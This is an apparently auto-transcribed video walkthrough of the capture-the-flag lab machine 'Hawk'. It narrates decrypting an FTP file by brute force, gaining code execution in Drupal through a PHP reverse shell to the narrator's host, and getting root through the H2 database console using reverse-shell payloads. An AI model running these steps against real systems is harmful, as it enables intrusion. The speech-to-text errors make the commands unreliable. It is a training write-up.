 what's going on YouTube the Zips I'm doing Hawk from half the box which is a box that can be divided up into three parts the first part is cryptography related you have to pull a file off a FTP server that was anonymous authentication find out that files encrypted with open SSL and then find a way to decrypt the file that file gives you credentials to log into Drupal as a administrator user and from there and almost any like content management system CMS like Drupal is you can find a way to get code execution with admin by either modifying themes creating a purse with PHP code installing a plug-in there's a lot of ways to get code execution on those type of web services so you get a code execution on the box and then you can exploit the database which is a my sequel database that's written in Java called h2 and abuse create a tunnel to the box so you can connect to the sequel database from localhost and then find a way to get code execution it's a pretty fun box so let's just jump in as always with straw for the MF so nmap - SC for default scripts sv enumerate versions Oh a output all formats put in the and map direct and call this Hawk and the IP address which is 10 10 10 102 can take some time to run so I've already run it looking at the results we see quite a bit of information we have FTP listening on port 21 it is running version vs so it's running vs FTP D version 303 it's got anonymous FTP login allowed and in that we have a directory called messages this information not really that interesting the next thing we have is SSH listing on port 22 its banner says OpenSSH 7.6 Ubuntu 4 and if we look at this I believe this is Ubuntu Bionic beaver so searching this looking at launchpad we do see OpenSSH server 7 6 p 1-4 is related to Bionic so we know this is not Ubuntu zhenya like most boxer this is my on it not really that interesting the next thing we have is Apache listing on port 80 it's version is - 4 - 9 and again we could confirm this by just googling Ubuntu HD PD - four to nine looking at the packages you want to Apache - and we see bionic has this and Ubuntu Danielle's would be two four one eight make that a bit bigger so Bionic to four to nine Daniel to four one eight Daniel's also to Ubuntu three and bionics one Ubuntu for don't know exactly how they come up with all those numbers but easy way to flag what distro is running when you get piece type of banners the Apache looks like it is running a Drupal seven website it's got a HTTP robots.txt and all the standard Drupal exclusions the one I find most interesting always is change logs because if we go to ten ten ten 1:02 slash change log we get the drupal version most likely running which is seven five eight and 2018 much 28th so and then finally the last port is another HTTP service this one is listening on 8080 - and it says it's the h2 database HTTP console haven't really seen that one before so I'm going to poke at it and look and we see only remote connections are allowed only local connections are allowed remote connections are disabled so let's go and poke at that FTP service since it's got an anonymous login and it's almost instantly checked so we do FTP 10 10 10 102 log in with anonymous and we can do dir and get the messages directory I'm also going to do dir - a - from you all files including hidden ones and we don't see anything let's go into messages to another dir it's an empty directory but if we do dir - a to view hidden files we see there is a drupal text anc so let's get this file drupal text anc and if we cat it out we do just get a bunch of base64 so I'm going to do base64 - deep to decrypt it and we get a bunch of gobbledygook so I'm going to make a directory called encrypted or A&Z and we're going to direct this into it let's call this encrypted so if we cat this file we get that salted thing if we run file against it we see that is open SSL encrypted data with a salted password so I'm going to do a WC - C against it to count the number of characters and we see it is a hundred and seventy-six which means it's divisible by 8 so it's most likely going to be a block cipher if it wasn't divisible by 8 it could be like a stream cipher or just other forms of encryption so we'll do open SSL - help help No - there and we can see cipher commands so it's probably encrypted with one of these so let's open up a different pain and we'll say go in encrypt B cipher OST let's do well that's annoying I have to go to Spain to copy so a copy a few of these algorithms will do a s 256 128 cbc will do that's a kind of code block I believe would do ECB as well which is electronic code block a counter block cipher I think is what a CBC counter block chaining actually I believe CBC cipher block chaining Oh so let's do another one I'm picking a lot of AES because AES is common so we'll do Oh F B what is ofb let's do this oh it be here what do you owe FB output feedback cipher feedback okay whatever we'll do a s 128 ofb now we can do let's do some that part a yes we'll do the good old stream cipher rc4 and rc4 - cbc then let's pick one we haven't really heard of let's do area 128 cbc and that one is right there and we'll do one last one let's do des so we get a list of cipher algorithms now we have to encrypt a bunch of data because the goal what I'm doing is trying to make something that looks like that so let's do 4i and sequence 0 8 and that was what 176 176 so for I in sequence 0 8 176 and that middle number when sequence gets three characters this is called a step variable so if we do echo I done it's just gonna count by eight so and I'm limiting at 176 because generally when you encrypt data you don't reduce the amount of space so most likely the plaintext behind this encrypted is less than 176 characters so let's just do this in a file actually encrypt dot sh 4i n 0 8 128 do this will be we don't have to do it in a file I don't know what I was thinking let's just do do Python - C print a times I and let's swap up these quotes because I think if I did do that then it would send Python dollar I instead of the number and will direct that to dollar I so now we should have files like the file 128 has 128 days in it for 129 a's be 128 I think that's letÂ´s do echo - n WC - C 128 days and then it's got a line break so that would be fine so keep in mind that all the files are plus 1 and length so 0 is really one character big because it's got a line break at the end and then we find we're just encrypting data it didn't have to be divisible by 8 I was just doing it so we can see if the file is one block long 2 blocks long 3 blocks long 4 blocks long etc so hopefully that'll make sense eventually so we got ciphers and we got a bunch of files so now let's do in Krypton Sh and we'll do for I in will do for cipher and cat ciphers dot list do and now we gotta do for the number so this would be the length we can call this length and LS grap zero to nine so if it begins with zero if it begins with a number do something with it I think I do an open a cell command here done done so we gotta figure out what the OpenSSL command to encrypt is so open SL encrypt - help and we got - in - out guess and we just do - cipher so I'm gonna do V ciphers dot list and let's do - so ed - one ciphers got list so we do open SL encrypt - AES 256 cbc - e to encrypt - in the file let's do 128 - L would do test and then let's do - k specify a passphrase and we'll do please subscribe so if we cat test we get data that looks like the what we expect it looks like encrypted so there are other things we can see you shouldn't use passphrase using - adder or pbkdf2 would be better so we can see what that looks like if we do - what is it itter 20 and then we do please subscribe please subscribe please we can see what that looks like as well so probably should do both the pbkdf2 and - k but I'm ignoring that first because we'd have to know the iteration count and that's just doing something called like key stretching it just does the encryption multiple times I think to make it stronger but that means when we try to brute force it we also have to know what iteration count it is so I'm just ignoring that whole piece at first and if it doesn't work with - K then I'll go into and trying enumerate the other formats hopefully that makes sense so where we're at right now is we have to identify what cipher we want to use so let's go back to a encrypt Sh paste the OpenSSL command and we would do open SSL encrypt cipher and it pastes the whole thing - n this will be length - L will do length - we'll just do a wing cipher dot ENC - k please subscribe looking over that command should be good so let's run it cipher I have plural there so let's just do that bash encrypt dot SH and doing a lot more than I expect maybe I just have a lot of files let's do LS to unencrypt that's not right it combined things so we have like 96 aes-256 ECB which is what expect and then dot and see - good AES 256 ofb so so move that or Amster in crypt how did I screw this up Krypton Sh echo this line what do my commands look like my commands look fine like I don't see it changing lines like it did here like that's two files weird copy this paste it and that looks better so I don't know what was going on when I don't do this echo but it's working right now so we can do LSD and see now we can do zog's WC - see and we can see all the things so we see ofb the output feedback is 25 so this may not be a block cipher see the RC fours they're not divisible by 8 either des I believe 112 is 112 divided by 8 that's 110 yep 14 so we can easily tell which a block cipher ISM which are not just by this so we wanted WC - see on encrypted 176 so we'll grep for 176 and then a space because I think we have files that have 176 in it so if I got 176 and include the space right here will only get ones that are 176 characters in length so we have a few we have a s 144 characters 152 characters equal 176 and length and we also have this area and we also got DES so if we cut this des whoa that was cool so it's got some weird ASCII character in this where if I kept this I cursed and went all the way up here so starts there gears here it just screwed with my terminal I found that fun anyways let's look at Aria I made this change the size cat we don't have salted here so I'm going to throw this algorithm out the window I think got this one oh we got salted there but 128 weight one three two let's do x XD against this okay it's again weird ASCII characters so carrying this out we don't see salted but if we throw it in a hex editor so we don't display all this weird junk we do see we see it so opensl is always gonna throw that salted beforehand so you just to pick what we think is going to be the most common encryption thing or just you these to choose from we're assuming in decrypted Texas somewhere between 144 152 characters not really needed to know that but we assume it's one of these algorithms and I'm going to choose a s 256 cbc just because this is the most common first and we can do a tool called brute-force salted open SSL if you don't have this it is simply on the cali repo so you just search for it you should be able to install it so we'll do brute force salted open ssl and we want to use - h - view options and we'll do - t for the number of threads let's do ten threads - f the file user share would list rocky text the see what's after this we still got more options or C - C we're going to do the cipher it defaults to AES 256 cbc so again it is common the digest - dthe the message digest portion I'm changing this to sha 256 because if we just Google opensl default message digest we're gonna see sha 256 is the default digest and this tool uses md5 so I think that's all we need so - see a s 256 cbc - d sha-256 and we need to specify the file so encrypted lowercase C and we get right away password candidate friends so let's try out that password we do open SSL encrypt - help we have a - D option to decrypt so - D then specify encrypted know - G - in encrypted - L decrypted - K friends if we can't decrypted wait what cat encrypted oh we didn't specify an algorithm encrypt - a s 256 cbc character cryptid there we go so that's interesting I guess on failure it just copies into L so but cat decrypted Daniel the following password for the portal pencil keyboard scanner one two three please low when the portal is okay so let's copy decrypted to FTP decrypted file okay and we'll poke at will try like FTP FTP 10 10 10 100 - sorry Daniel try the password now anonymous login only so we can't even do authenticated logins so we can ignore FTP altogether and let's move on to Joomla since that was the next port that's listening we could just try SSH Daniel at 10 10 10 100 - yes paste this in and please try again so that's not his password so let's move over and check out Joomla I think I said Joomla I met Drupal so 10 10 10 102 we get the Drupal page and let's take a full look at this so the first thing I'm going to do while I poke at it is run a tool called droop scan and you can just do github dr ope scan and it's just a drupal scanner and i looked at a few of them I'm Emily I normally just look at the last commit date and choose the one that's been committed to most recently because there's a lot of these CMS type scanners that just don't get updates so troops can we want to do scan Drupal - you HTP 10-10-10 102 and looks like it scanning so well that goes let's take a look at what we can do we can first try logging in with junk and Anna unrecognized username and password try logging in with a default unrecognized username and password so right now I'm just looking for a way to enumerate usernames because if we look welcome to this no page content we don't really have anything so let's go to register an account let's do admin junk at junk com create new account name admin is already taken and the email address is not valid so if we do a SD create we just get email address not valid so I didn't mean to do this but I think for this video I just found a cool way to enumerate yeah so if we do create an account username and put a invalid email address it will enumerate the user and then not create it if we had valid email addresses like I just did it becomes very evident that the site was attacked because it creates a bunch of users putting in valid email addresses may not so that may be something to look into and pretty cool so we have a way to validate user names if we look at Daniel we do see Daniel probably has oh no there is no user name for Daniel is that how I spelled it let's cat FTP da and ie L Daniel great new account does not exist so that's pretty cool if we try to log in we did that before request new password we can also do it here unable to send email if we do request new password and it doesn't exist it says not a recognized username or password so we have two different ways to enumerate users and this is the way I had done it before but it always emails users I now like this trying account name thing because I believe that will be silent I have to look more at the backend but yeah so we know admins a user we know Daniel isn't we can try like slash user and then a lot of things like CMS is like user one maybe we get access denied user to access denied user three page not found so we know there's two users on this box one of those users is admin the other user is most likely the one we created a few minutes ago when I was showing the invalid valid email thing so let us try logging in with admin so I'm going to do pencil keyboard scanner 1 2 3 as the password so admin well again page 3 could not be found if we do user 2 we have the user a SD and his email yep this is the one we did just a few minutes ago creating user so that's why you should always do invalid emails when you do this on Drupal so it doesn't create the account and it becomes less evident you were mocking around so let's see what else can we do let's go to content try to add content we'll do article and we can do filtered HTML full HTML and plain text and if we go back to a drupe scan we have plugins found PHP so this is why it always helps to do some type of recon in the background because we'll see hey there's a PHP plug-in and I know Drupal has allows PHP and the content if that plug-in is enabled so I went into modules more searching for PHP we can add this filter to enable the plug-in save the configuration then we can go to content add content then we can do anything like article and now under this text format we have PHP code so we can call this article test and then just write PHP PHP info to prove we have code execution there should be a preview so we don't even have to save this page and we get PHP code execution awesome so let's see what can we do with this we can just create a PHP shell so let's do locate PHP is it land locate PHP grep shell and we'll have a bunch of various shells let's do this one I think cat this file yep this is a good one so let's go back content new content article and let's change this to test do X clip selection primary when I paste I'm going to do control shift V nope let's just do selection clipboard there we go now we got it so we got a PHP shell in this and we just got to change the IP and port so let's do ten ten fourteen seventeen I think that's my IP and that was my slack I got a mute my computer sorry about that so 10 10 10 14 17 and we'll do port 9000 1 and CLV NP signs out actually good a new window let's name this red shell I just wanted to stay in my working directory HTTP boxes hawk and the previous one was in droop skin so NC l VMP 9001 and let us do preview oh crap I didn't do the correct thing so way to get out of this preview there we go we change it from filtered HTML to PHP code preview go back and we get a shell as WW data awesome so next thing to do is let's do a Linux enumeration so let's fix our TTI with Python - C input PT y PT y dot spawn and bash Python 3 - C import PT y PT y dot spawn and - there we go control-z to background stty wrong - echo FG to foreground and we now have like tab autocomplete which is just nice so I can create a dub dub dub directory and then let's move opt linen oom plan a new message here start a web server on our box so Python M simple HTTP server and we can curl ten ten fourteen seventeen when a new message pipe it over to bash and we got to specify port 8000 and a new got SH nope seventeen eight thousand when a new got Sh bash there we go so well that goes let's go up to the top and see what we have so the Winx kernel compiled may twenty third two thousand eighteen probably around time this box was released so won't look for kernel probe esque we do have 1804 LTS Bionic beaver usernames root and Daniel and we have Daniel logging in from ipv6 back in July first I don't know why they use the ipv6 address that's funny let's see going down contents of passwd we should have the Daniel user here back up here this UID 1002 home Daniel Michelle is Python 3 that is odd user accounts let's go up root user account get back here home directories just Daniel and only Daniel can write to it looks like we can go into it and look at what files are there so that's really to execute going down jobs tasks nothing too interesting crontab nothing interesting IP address information gateway name servers tcp we have that port 8080 too and that is that h2 database thing that we mentioned before we can't see what user is running is let's see oh let's see here Apache is running as dub dub dub data that's the parent process there's another thing like h2 will probably do psdf to search this quickly there we go we got that h2 web server running as root so this was listening probably on port 8080 2 or 8000 to whatever it was the h2 database I see opt h2 here so we know that maybe the next thing to exploit scrolling down scrolling down MySQL nothing else is it too interesting so let's go into home Daniel we can get user dot text maybe looking at it use it our text anyone can read it so we do WCC user dot txt bash histories pipe to dev null we could go over dub-dub-dub HTML and look at the drupal stuff we cat is it web config where is the database password nope let's just do our password dot that's a lot of files let's grab config crap - I config not there let's do I can't clear my terminal what is it is it export term equals X term there we go now I can clear what is the Drupal file notice web config sit under maybe settings Jeff - I setting less sites default settings and database settings let's just cat that file - I pass my hand there's so much junk here grep - V get out wild code did not work there we go password right there so it's my terminal screwing up but we got let's go here and search for that so cat that file grep Drupal for one do - a three - B 3 let's just less this so its default settings I should not be lazy and just fix my terminal completely so Drupal or is Drupal for Hawk we saw it Drupal hash here we go here's the database connection settings so we have database user username Drupal password rupal so you don't have to do this I'm just showing you that it was a path so if we SSH Daniel at 10 10 10 102 and try password reuse with that Drupal for Hulk password we get in and then we can do import OS OS - I think exec - what is OS - system - there we go and we can escape that Python shell and get on the system as Daniel and what that allows us to do is we can do to cool things we can either do it from a reverse shell as dub dub dub data or we can do it from our box but in that process list if we go back PS EF graph h2 we want to get to port 8080 - I think it's 8080 - 10 10 10 102 8080 - we want to get to this port the h2 console it says remote connections are disallowed we want to be a local connection so we can do SSH - el and we're gonna listen on one of our local ports I'm going to do 9000 - and then the colon is going to forward it so localhost what's forward 127 0 0 1 and what's after this colon is being executed on the server so we're saying on output 9000 - we could also do like 0 0 0 that's how the command looks but most of the time ssh only allows you to listen on your loopback address so we're listening on one 27001 port 9000 - and we're going to go through ssh and when we go through ssh and land on the other end we want to direct their traffic to one 27001 on port 8080 to Daniel at 10 10 10 102 Drupal for Hulk and now if I do net stat on my local box a LNP draft 9000 - we see I am listening ssh has that process and if i go in here one 27001 9000 - we get the console and this is working because we're no longer remote if we just go to a reverse shell curl one 27001 80 82 we get the same thing but we're getting a JavaScript here because the console wants javascript so if we want to do the show without doing this local thing we can do go back to a wet on w data and we can do SSH - are for reverse and then the same thing so we'll say 80 82 1 27001 just right I think this is right meaning see I always get these two confused we'll try this and then reverse the ports and we'll find out which one's correct so let's do passwd epic passwd if set a password ok service ssh Sturt ok go to reverse shell up at 10 10 14 17 yes click the password and we may get in did I type my password correctly let's try that again password password the Etsy passwd yep he has a show there we go so now I'm in if we go back to my box netstat al NP grep 9003 not listening grep 80-82 I am listening so I had that backwards so let's go back in this Shell SSH - are nine thousand three eighty eighty two so this is going to go through the tunnel and it's going to force my Linux box to listen on port 9000 three and that will have access to 80 82 on this box so let's try this 88 - is not listening 9000 3 is and if we try to log into one 27001 9000 3 we get the same thing so we just did a local and reverse I think it's - noise reverse boy just data SSH tunnel from SSH and to SSH or whatever we did SNA channels both ways so let's now begin looking at this h2 console and exploiting it the first thing I'm going to do is go back to my box and we gotta get a shell so input OS OS dot system - and let's see if we can find the credentials to that um h2 database so we do PS - EF graph H - it's in OP - H - so I'm guessing the creds are probably somewhere in that directory and we get permission denied so I don't think we can find those creds p SEF grep h - CD Proc 799 CMD line don't get anything got environment permission denied what can we look at root permission denied I don't think we can really get anything I don't know why I was going into that process directory no idea what I was thinking let's just do search boy h2 and we get a few things h2 database alias h2o not it so information disclosure we'll start there so search boy dash X does this give us anything about creds secure handling missions the backup function of our attack is to read sensitive files outside the mission so this is a credential thing probably and that's cool special thanks to http hacked the box and the fallen angels team so thank you for creating the script but I wish it would tell us what we had to do - H - D - f I'll put directory let's just execute this and see what happens so search Boyd I think - M for mirror there we go Python for 5 - H 127 does it have creds hard-coded si mmm nope so let's try python 45 105 - d temp - F at C shadow try this me - h1 27001 9003 follow zipped in temp so let's go back to a shell C D temp and let's tap grab 8 - 2 LS grab 8 - 2 - I'm gonna say I don't know how this exploit works let's just I guess do it locally on the box real quick and then we'll move to the next one python m simple HTTP server 80 will do 8000 again OD in use so I'm still listening let's go to Daniel OS curl 10 10 14 17 / what's that script name 45 105 45 105 pi/2 x boy PI Python exploit PI Python 3 exploit PI and this script probably requires Python - so I'm gonna ignore this whole thing and let's go search poit - X H to search for H - not - X let's go to this alias 1 so let's search boy - X we can look at this H - database gambler he's got a blog post about it so instead of looking at this code let's check out the blog post so introduce the h2 database content so this is a way to create a shell so let's try default passwords let's try first sa no password test connection wrong username si admin si si destroy a dmin dmin connect one of test isn't working nope let's try username si let's just Google h2 database default credential see user si pass with nothing JDBC let's just check if the creds were in like the command line so go back to SH PS EF grep h2 and we don't see any creds let's go back here let's change the JDBC URL out of test let's just go to root and about a database name let's just create our own database name and we get connected so there we go now this screen is looking familiar as what we see here so let's copy this command paste it in run and we get code execution as root so we can do like WCC root root text and we see the code execution and on this article was actually there's really cool thing RSG a reverse shell generator that I'm maybe using from now on so if we do CD /opt get clone CD rsg let's do dot slash osg no module name less install Sh what are you doing pip install - our dependencies and then doing a symlink that's fine so let's install this and I just looked at this i've never actually ran it before but this ASCII term ASCII cinema was pretty cool good clone install and now rsg IP address port and that gives you a bunch of reverse shells that's on that like reverse shell cheat sheet so we should have that installed let's do rsg 10 10 14 17 port will do 9,000 for now and we get a bunch of shells who even a powershell one nice so let's go up let's do this we'll try this bash reverse shell first and just go down the west until we get one so h2 console replace this with their shell and then NCL vnp 9,000 for run did not get a call back so let's do the next one try this reverse shell and one of these will hopefully work well it's a lot of blank space click go undefined function it's got a bunch of bad characters probably Perl copy/paste run note neck at my catchin fail as long as the right version of neck add on it run and see nope so maybe this isn't as cool as I thought it would be let's do netcat reverse shell this way let's just do it without any special characters so well first m KN o d oh wait I think I have let's make this bigger there we go run did not get the shell paste from this that command succeeded and where'd it go here we go paste run not getting anything back there we go we got a show maybe oh we got a connection back no shell it's that day so let's try the Python one this may have bad characters Python 3 I think I deleted too much paste and we want to specify Python 3 run no shell so let's go back up here and test this bash reverse shell I don't know how that's working actually it's not typing bash first let's try this one so let's go to Daniel run this team ox we get a connection so it must be a bad character that's session I want so let's do VI exact is H paste this in chmod plus x exact SH go back to 7l v NP 9000 4 and we can just call where's Python 3 put a single quote there doesn't look it mattered but bash tab exact is H this should work Zack ID run oh we broke it completely so let's go back copy his example and run it again good Ilyas let's do shell exact - maybe those Java has next call shell exact - ID reload this page I may end up reverting this box and doing it again let's do database i connect no suitable driver Epps AK test connection I think we crashed it I think something we did crash this service epic test and we're waiting so it didn't like something we did I'm gonna revert this box and we will try again the box has been reverted so if we try to go to the page again we get an unable connect because there SSH tunnels aren't existing yet so very valuable lesson always create some type of Devin buy them before you do exploits because even things you think may be benign can have a bad effects so let's kill all the team Oakes pains and Weaver to the box clean up and start from scratch so let's see okay we're back here and let's do SH - L would do listen on port 9000 three localhost and we want to connect to 8080 - we're going to use Daniel at 10 10 10 102 I think and the password was Drupal I keep miss typing do UPA l4 hawk there we go we're logged in we should now be able to get to the h2 console we test the connection with test invalid username and password create our own database like please subscribe to me test connection test successful we can connect test his payload out run we a route so let's go back to SSH escape this OS system - okay CD tap v x sh and we're going to do rsg ten ten fourteen seventeen point nine thousand four and let's grab the bash one so grab this we verified this works and bash paste this in chmod plus x exact RS h so if we do temp exact RS h i don't know why create this pain NCO v NP nine thousand four run we get a connection okay so now we should just be able to call temp exact Sh no bad characters there at all run and there we go we got the shell so WCC rude txt here we go and that's funny it created the database here but yep that is the box so hope you guys enjoyed it take care and I will see you all next week actually I misspoke I want to show one last thing I was recording the intro for this video I always record the intros after I do the whole box so I know exactly what's gonna be in the video if I run into troubles what not but I was looking at exactly what h2 is and h2 database is literally just a Java my sequel database so if we go here h2 is a Java sequel so it clicked that the cadential x' to get in immediately so if we do localhost or 9003 these this just created a whole new database which is why if we go to root CD / root these are probably my sequel databases so drupe will not move let's see file data but this is probably my sequel stuff so let's try Drupal and test connection we get wrong username and password so let's go into the drupal config file for dub dub HTML i get denied let's just do something stupid and give chmod chmod 777 / dub dub HTML give everyone access to this and then the config file was in cites default and then settings dot PHP whoops drupal awk there we go and here's the database connection file so we could just say the database is Drupal the user name is Drupal and the passwords Drupal for hawk so if we go here and put the you well as Drupal the username as Drupal and the password as Drupal for hawk test connection connected got to put the password in and now we're in the Drupal database so this is probably the correct way to do it and is probably just unintended that you can specify a non-existent database and it creates it for you so now that's the box I hope you guys enjoyed take care and I'll see you all next week